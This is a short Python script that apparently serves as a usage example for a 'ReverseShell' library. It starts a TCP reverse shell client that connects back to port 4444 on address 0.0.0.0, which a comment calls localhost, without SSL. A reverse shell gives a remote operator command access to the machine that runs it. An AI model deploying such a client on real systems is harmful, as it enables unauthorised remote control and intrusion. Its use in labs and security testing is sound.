# client.py
from ReverseShell import ReverseShellClientTcp

# Connects back to the server on localhost:4444
client = ReverseShellClientTcp(address=("0.0.0.0", 4444), ssl=False)
client.run()